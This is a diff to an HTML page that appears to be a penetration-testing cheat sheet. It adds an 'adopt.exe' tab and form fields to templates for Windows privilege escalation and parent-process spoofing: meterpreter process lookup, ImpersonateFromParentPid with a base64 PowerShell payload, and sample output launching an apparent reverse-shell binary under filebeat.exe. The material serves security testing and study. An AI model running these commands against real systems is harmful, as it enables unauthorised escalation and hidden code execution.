@@ -157,7 +157,7 @@
   </ul>
 </div>
   <div id="dynamicFormContainer">
-	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="PID">PID: </label><input type="text" name="PID"></div><div class="input-group"><label for="POWERSHELL_3_BASE64">POWERSHELL 3 BASE64: </label><input type="text" name="POWERSHELL_3_BASE64"></div><div class="input-group"><label for="autoReplace">Auto Replace: </label><input type="checkbox" id="autoReplace" name="autoReplace"></div></form>
+	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="CMD">CMD: </label><input type="text" name="CMD"></div><div class="input-group"><label for="PID">PID: </label><input type="text" name="PID"></div><div class="input-group"><label for="POWERSHELL_3_BASE64">POWERSHELL 3 BASE64: </label><input type="text" name="POWERSHELL_3_BASE64"></div><div class="input-group"><label for="PROCESS">PROCESS: </label><input type="text" name="PROCESS"></div><div class="input-group"><label for="autoReplace">Auto Replace: </label><input type="checkbox" id="autoReplace" name="autoReplace"></div></form>
 	<div class="buttons center">
 		<button id="form_btn">Show Inspector</button>
 		<button id="replace_btn" style="display: none;">Replace Params</button>
@@ -171,6 +171,8 @@
 
 <button data-tabset="set1" data-tabcontent="tab2">psgetsys.ps1</button>
 
+<button data-tabset="set1" data-tabcontent="tab3">adopt.exe</button>
+
 </p><div class="tabset-wrapper" data-tabset-group="set1"><div class="tabcontent active" data-tabset="set1" data-tabcontent="tab1"><div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Inside meterpreter
 </span></span><span class="line"><span class="cl"><span class="go">ps winlogon
 </span></span></span></code><div class="output-bubble">Sample Output:
@@ -182,7 +184,16 @@ TO-DO</div></pre></div></div><div class="tabcontent" data-tabset="set1" data-tab
 </span></span></span></code><div class="output-bubble">Sample Output:
 TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">ImpersonateFromParentPid -ppid <span class="o editable-keyword">&lt;PID&gt;</span> -command "c:\windows\system32\cmd.exe" -cmdargs "/c <span class="o editable-keyword">&lt;POWERSHELL_3_BASE64&gt;</span>"
 </span></span></span></code><div class="output-bubble">Sample Output:
-TO-DO</div></pre></div><p><small><em>Ref: <a href="https://github.com/decoder-it/psgetsystem">psgetsys</a></em></small></p></div></div>
+TO-DO</div></pre></div><p><small><em>Ref: <a href="https://github.com/decoder-it/psgetsystem">psgetsys</a></em></small></p></div><div class="tabcontent" data-tabset="set1" data-tabcontent="tab3"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\adopt.exe '<span class="o editable-keyword">&lt;PROCESS&gt;</span>' '<span class="o editable-keyword">&lt;CMD&gt;</span>'
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">PS C:\windows\tasks&gt; .\adopt.exe filebeat.exe "C:\windows\tasks\rev.exe"
+</span></span></span><span class="line"><span class="cl"><span class="go">.\adopt.exe filebeat.exe "C:\windows\tasks\rev.exe"
+</span></span></span><span class="line"><span class="cl"><span class="go">[&gt;] Target pid is 2776
+</span></span></span><span class="line"><span class="cl"><span class="go">[&gt;] ShellExecuteExW is at 00007FFBE93E74A0
+</span></span></span><span class="line"><span class="cl"><span class="go">[&gt;] Thread running, done! (Handle: 192)
+</span></span></span></div></pre></div><p><small><em>Ref: <a href="https://github.com/xct/adopt">adopt.exe</a></em></small></p></div></div>
+
+
 
 <p></p>
 
